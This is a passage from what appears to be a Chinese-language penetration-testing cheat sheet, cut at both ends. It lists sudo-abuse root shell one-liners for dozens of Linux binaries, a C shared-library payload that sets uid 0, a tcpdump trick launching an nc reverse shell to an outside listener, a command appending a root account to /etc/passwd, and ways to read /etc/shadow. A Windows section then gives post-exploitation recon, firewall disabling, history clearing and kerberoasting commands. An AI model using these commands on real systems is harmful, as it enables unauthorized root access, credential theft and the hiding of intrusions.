class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nice /bin/bash<br></code></pre></td></tr></table></figure><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">TF=$(mktemp)<br>echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF<br>sudo nmap --script=$TF<br></code></pre></td></tr></table></figure><h3 id="node"><a href="#node" class="headerlink" title="node"></a>node</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo node -e &#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;<br></code></pre></td></tr></table></figure><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nohup /bin/bash -c &quot;bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot;<br></code></pre></td></tr></table></figure><p>tmux</p><h3 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo openvpn --config /etc/shadow<br></code></pre></td></tr></table></figure><p>读取/etc/shadow的第一行</p><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo passwd<br></code></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;<br></code></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo php -r &quot;system(&#x27;/bin/bash&#x27;);&quot;<br></code></pre></td></tr></table></figure><h3 id="pico"><a href="#pico" class="headerlink" title="pico"></a>pico</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo pico<br>^R^X   #ctrl + r 和ctrl + x<br>reset; bash 1&gt;&amp;0 2&gt;&amp;0<br></code></pre></td></tr></table></figure><h3 id="pkexec"><a href="#pkexec" class="headerlink" title="pkexec"></a>pkexec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo pkexec /bin/bash<br></code></pre></td></tr></table></figure><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo python3 -c &quot;import os;os.system(&#x27;/bin/bash)&quot;<br></code></pre></td></tr></table></figure><h3 id="rvim"><a href="#rvim" class="headerlink" title="rvim"></a>rvim</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rvim -c &#x27;:py import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;reset; exec bash&quot;)&#x27;<br></code></pre></td></tr></table></figure><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">TF=$(mktemp)   #声明一个变量TF，指向一个新建的临时文件<br>echo &#x27;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; &gt; $TF  #将提权逻辑写到临时变量中<br>chmod +x &quot;$TF&quot;  #给变量（临时文件）添加执行权限<br>sudo scp -S $TF x y:<br></code></pre></td></tr></table></figure><h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo screen<br></code></pre></td></tr></table></figure><h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo script -q /dev/null<br></code></pre></td></tr></table></figure><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo sed -n &#x27;1e exec bash 1&gt;&amp;0&#x27; /etc/hosts<br></code></pre></td></tr></table></figure><h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service ../../bin/bash<br></code></pre></td></tr></table></figure><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo socat stdin exec:/bin/bash<br></code></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ssh -o ProxyCommand=&#x27;;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; x<br></code></pre></td></tr></table></figure><h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim getRoot.c<br></code></pre></td></tr></table></figure><p>写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br> <br><span class="hljs-comment">//指定静态无返回值的函数，设置属性constructor</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>__<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//设定uid为0，即root</span><br>    setuid(<span class="hljs-number">0</span>);<br>    system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC -o getRoot.so getRoot.c<br>sudo ssh-keygen -D ./getRoot.io<br></code></pre></td></tr></table></figure><h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo strace -o /dev/null /bin/bash<br></code></pre></td></tr></table></figure><h3 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo systemctl<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim getRoot.sh<br></code></pre></td></tr></table></figure><p>写入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mknod getRoot_pipe p &amp;&amp; /bin/nc 10.10.10.128 4444 0&lt;getRoot_pipe | /bin/bash 1&gt;getRoot_pipe <br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>nc -lvnp 4444<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">靶机</span><br>chmod +x getRoot.sh<br>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z getRoot.sh -Z root<br></code></pre></td></tr></table></figure><h3 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>openssl passwd -1 -salt newUser &#x27;123456&#x27;  #用openssl生成一个passwd格式的hash<br><br>newUser:$1$newUser$.KLMnIw2g2qsFYDp7QnFf0:0:0:root:/root:/bin/bash #根据/etc/passwd的格式构造newUser出的信息<br>new:$1$new$OVfDVMTOiOgpbam1pWfpz0:0:0:root:/root:/bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">靶机</span><br>echo &#x27;newUser:$1$newUser$.KLMnIw2g2qsFYDp7QnFf0:0:0:root:/root:/bin/bash&#x27; | sudo tee -a /etc/passwd<br>su newUser<br>123456<br></code></pre></td></tr></table></figure><h3 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo timedatectl list-timezones<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo tmux<br></code></pre></td></tr></table></figure><h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vi<br>:!/bin/bash<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">或者</span><br>sudo vi -c &#x27;:!/bin/bash&#x27; /dev/null<br></code></pre></td></tr></table></figure><h3 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo wall --nobanner /etc/shadow<br></code></pre></td></tr></table></figure><p>读取/etc/shadow</p><h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo watch -x bash -c &#x27;reset; exec bash 1&gt;&amp;0 2&gt;&amp;0&#x27;<br></code></pre></td></tr></table></figure><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">TF=$(mktemp)<br>chmod +x $TF<br>echo -e &#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27; &gt;$TF<br>sudo wget --use-askpass=$TF 0<br></code></pre></td></tr></table></figure><h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo xxd /etc/shadow | xxd -r<br></code></pre></td></tr></table></figure><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zip foo /etc/hosts -T -TT &#x27;bash #&#x27;<br></code></pre></td></tr></table></figure><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="本机信息"><a href="#本机信息" class="headerlink" title="本机信息"></a>本机信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tree /f<span class="hljs-comment"># 以树状图的形式显示当前目录</span><br>tree /f C:\Users <span class="hljs-comment"># 以树状图的形式显示目标目录</span><br><br><span class="hljs-comment"># 快速查看 Windows 版本和补丁情况</span><br>cmd.exe /c <span class="hljs-string">&#x27;systeminfo | findstr /B /C:&quot;Host Name&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot; /C:&quot;Hotfix(s)&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="系统程序"><a href="#系统程序" class="headerlink" title="系统程序"></a>系统程序</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net config workstation <span class="hljs-comment"># 显示当前工作站的配置，包括计算机的名称、工作站域、软件版本、工作站域的登录服务器名等</span><br>net config server                                 <span class="hljs-comment"># 显示服务器服务的配置，包括服务器角色、自动暂停服务时间、最大同时连接数、每个会话的最大请求等</span><br>systeminfo                                                    <span class="hljs-comment"># 查询全部内容</span><br>wmic qfe get Caption,Description,HotFixID,InstalledOn         <span class="hljs-comment"># 查询已安装的补丁列表</span><br></code></pre></td></tr></table></figure><h4 id="AV"><a href="#AV" class="headerlink" title="AV"></a>AV</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Service</span> WinDefend<span class="hljs-comment"># 检测 Windows Defender 状态</span><br><span class="hljs-built_in">Get-MpComputerStatus</span> | <span class="hljs-built_in">select</span> RealTimeProtectionEnabled<span class="hljs-comment"># 检测 Windows Defender 是否启用</span><br></code></pre></td></tr></table></figure><h4 id="进程服务"><a href="#进程服务" class="headerlink" title="进程服务"></a>进程服务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tasklist /svc                              <span class="hljs-comment"># 显示进程列表</span><br><br>wmic product get name,version            <span class="hljs-comment"># 获取所有已安装软件的名称和版本信息</span><br>powershell <span class="hljs-string">&quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br><span class="hljs-comment"># 使用 powershell 查询所有安装过的软件及版本，效果和 wmic 相同</span><br>wmic service list brief                  <span class="hljs-comment"># 显示系统上所有服务的简略信息</span><br>wmic startup get command,caption         <span class="hljs-comment"># 查看启动项</span><br>schtasks  /query  /fo  LIST /v           <span class="hljs-comment"># 查看任务计划</span><br></code></pre></td></tr></table></figure><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh firewall show config                      <span class="hljs-comment"># 查看防火墙信息，但 firewall 命令已弃用，可使用 advfirewall 命令代替</span><br>netsh advfirewall firewall show rule name=all   <span class="hljs-comment"># 查看配置规则</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off\on  <span class="hljs-comment"># 关闭防火墙\开启防火墙</span><br>netsh advfirewall export\import xx.pol          <span class="hljs-comment"># 导出\导入配置文件</span><br>netsh advfirewall firewall add rule name=”deny tcp <span class="hljs-number">139</span>″ <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> protocol=tcp localport=<span class="hljs-number">139</span> action=block         <span class="hljs-comment"># 新建规则阻止所有入站方向的 TCP 端口 139 的连接</span><br>netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Remote Desktop&quot;</span> protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow              <span class="hljs-comment"># 新建规则允许3389通过防火墙</span><br>netsh advfirewall firewall delete rule name=Remote Desktop  <span class="hljs-comment"># 删除名为Remote Desktop的规则</span><br>netsh interface                                 <span class="hljs-comment"># 连接安全规则配置，很少配置。</span><br></code></pre></td></tr></table></figure><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami                                   <span class="hljs-comment"># 当前用户</span><br>quser                                    <span class="hljs-comment"># 查询登录用户，同 query user</span><br>qwinsta                                  <span class="hljs-comment"># 查询登录用户，同 query session</span><br>query user                               <span class="hljs-comment"># 查询登录用户</span><br>query session                            <span class="hljs-comment"># 查询会话</span><br>query termserver                         <span class="hljs-comment"># 查询远程桌面主机列表。</span><br>net accounts                             <span class="hljs-comment"># 查询域密码策略</span><br>net user                                 <span class="hljs-comment"># 查询本地用户列表</span><br>net user <span class="hljs-string">&quot;<span class="hljs-variable">$username</span>&quot;</span>                     <span class="hljs-comment"># 查询指定用户</span><br>net localgroup                           <span class="hljs-comment"># 查询本地用户组列表</span><br>net localgroup <span class="hljs-string">&quot;<span class="hljs-variable">$groupname</span>&quot;</span>              <span class="hljs-comment"># 查询指定用户组成员s</span><br>net localgroup administrators <span class="hljs-comment"># 本机管理员[通常含有域用户]</span><br>net <span class="hljs-built_in">group</span>                                <span class="hljs-comment"># 仅域控可执行，查询用户组列表</span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;<span class="hljs-variable">$groupname</span>&quot;</span>                   <span class="hljs-comment"># 仅域控可执行，查询用户组成员</span><br></code></pre></td></tr></table></figure><h4 id="操作记录"><a href="#操作记录" class="headerlink" title="操作记录"></a>操作记录</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">type</span> %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<span class="hljs-comment">#查看powershell历史记录，使用cmd</span><br><span class="hljs-built_in">type</span> <span class="hljs-variable">$Env:userprofile</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<span class="hljs-comment">#查看powershell历史记录</span><br><span class="hljs-built_in">Get-History</span> | <span class="hljs-built_in">Format-List</span> <span class="hljs-literal">-Property</span> *         <span class="hljs-comment"># 查询 powershell 当前窗口历史操作记录</span><br><span class="hljs-built_in">Clear-History</span>                                 <span class="hljs-comment"># 删除 powershell 当前窗口历史操作记录</span><br><span class="hljs-built_in">Clear-History</span> <span class="hljs-literal">-Id</span> <span class="hljs-number">3</span>                           <span class="hljs-comment"># 删除 powershell 当前窗口指定 ID 的历史操作记录</span><br>doskey /<span class="hljs-built_in">h</span>                                     <span class="hljs-comment"># 查看 cmd 的历史操作记录</span><br>doskey /reinstall                             <span class="hljs-comment"># 删除 cmd 的历史操作记录</span><br></code></pre></td></tr></table></figure><h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><h4 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ipconfig /all                     <span class="hljs-comment"># 列出当前主机详细网络信息</span><br>ipconfig  /displaydns             <span class="hljs-comment"># 列出dns缓存信息</span><br>route print                       <span class="hljs-comment"># 查询路由表</span><br>arp <span class="hljs-literal">-a</span>                            <span class="hljs-comment"># 地址解析协议缓存表</span><br>netstat <span class="hljs-literal">-ano</span>                      <span class="hljs-comment"># 端口使用情况</span><br>net share                         <span class="hljs-comment"># 查看共享信息</span><br>wmic share get name,path,status   <span class="hljs-comment"># 查看共享信息</span><br>net view                          <span class="hljs-comment"># 查看域列表</span><br>smbclient <span class="hljs-literal">-L</span> ip  <span class="hljs-comment">#列出smb服务器上所有可用的共享资源</span><br><span class="hljs-comment"># 查看 host 文件</span><br><span class="hljs-built_in">type</span>  c:\Windows\system32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">setspn <span class="hljs-literal">-T</span> domain.com <span class="hljs-literal">-Q</span> */*      <span class="hljs-comment">#利用Windows自带的setspn工具，普通域用户权限执行即可</span><br></code></pre></td></tr></table></figure><ul><li>利用 <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">GetUserSPNs.vbs</a></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cscript GetUserSPNs.vbs<br></code></pre></td></tr></table></figure><ul><li>使用 <a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Rubeus.exe kerberoast<br></code></pre></td></tr></table></figure><p>一些相关的powershell脚本<a href="https://github.com/PyroTek3/PowerShell-AD-Recon">PowerShell-AD-Recon</a></p><h4 id="协议探测"><a href="#协议探测" class="headerlink" title="协议探测"></a>协议探测</h4><h5 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /l %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">255</span>) <span class="hljs-keyword">do</span> <span class="hljs-selector-tag">@</span> ping <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.%i <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-n</span> <span class="hljs-number">1</span>|find /i <span class="hljs-string">&quot;ttl=&quot;</span>   <span class="hljs-comment">#快速扫描10.0.0.1 到 10.0.0.255</span><br>@<span class="hljs-keyword">for</span> /l %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">255</span>) <span class="hljs-keyword">do</span> @ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-literal">-w</span> <span class="hljs-number">40</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">40</span>.%i &amp;&amp; <span class="hljs-keyword">if</span> errorlevel <span class="hljs-number">0</span> (<span class="hljs-built_in">echo</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">40</span>.%i &gt;&gt; ip.txt)  <span class="hljs-comment">#输出到文件</span><br></code></pre></td></tr></table></figure><h5 id="Netbios"><a href="#Netbios" class="headerlink" title="Netbios"></a>Netbios</h5><ul><li>msf扫描</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf &gt; use auxiliary/scanner/netbios/nbname<br></code></pre></td></tr></table></figure><ul><li><a href="http://www.unixwiz.net/tools/nbtscan.html#download">nbtscan</a> 扫描</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">nbtscan <span class="hljs-literal">-m</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h5 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h5><p>msf扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf &gt; use auxiliary/scanner/discovery/udp_probemsf &gt; use auxiliary/scanner/discovery/udp_sweep<br></code></pre></td></tr></table></figure><h5 id="smb-version"><a href="#smb-version" class="headerlink" title="smb-version"></a>smb-version</h5><p>python版：<a href="https://github.com/amitn322/smb-version">amitn 322/smb-version</a></p><p>c#版：<a href="https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html">草泥马之家-c#版本的smb_version</a></p><p><strong>SNMP</strong> </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">msf &gt; use auxiliary/scanner/snmp/snmp_enum<br></code></pre></td></tr></table></figure><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><p>可以使用 wevtutil.exe psloglist.exe 或者 powershell 的<code>Get-WinEvent</code>模块进行日志导出，server 03 的域控可使用 eventquery.vbs 导出。</p><p>wevtutil 不需要 UAC， 支持很多过滤语法，若有需要请查看官方说明</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查询登录日志语法</span><br>wevtutil qe security /f:text /q:*[<span class="hljs-type">System</span>[(<span class="hljs-type">EventID</span>=<span class="hljs-number">4624</span>)]]<br><span class="hljs-comment"># 查询所有登录、注销相关的日志语法</span><br>wevtutil qe security /<span class="hljs-built_in">rd</span>:true /f:text /q:<span class="hljs-string">&quot;*[system/eventid=4624 and 4623 and 4627]&quot;</span><br><span class="hljs-comment"># 远程查询时在后面加入/r:computer /u:user /p:password 比如查询dc1上的登录注销日志</span><br>wevtutil qe security /<span class="hljs-built_in">rd</span>:true /f:text /q:<span class="hljs-string">&quot;*[system/eventid=4624 and 4623 and 4672]&quot;</span> /<span class="hljs-built_in">r</span>:dc1 /u:administrator /p:password<br></code></pre></td></tr></table></figure><p>本地使用 LogParser 日志分析工具整理导出的日志，然后去除重复数据、无效数据（以 ‘$’ 结束的用户名）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">LogParser.exe <span class="hljs-literal">-i</span>:EVT <span class="hljs-literal">-o</span> txt <span class="hljs-string">&quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;)) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&#x27;|&#x27;)) as SOURCE_IP FROM C:\ProgramData\log.evtx&quot;</span> &gt; C:\ProgramData\log.txt<br></code></pre></td></tr></table></figure><p>导出域控登录日志到域控上:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wevtutil epl Security C:\ProgramData\dc.evtx /q:<span class="hljs-string">&quot;*[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;3&#x27;] and System[(EventID=4624) and 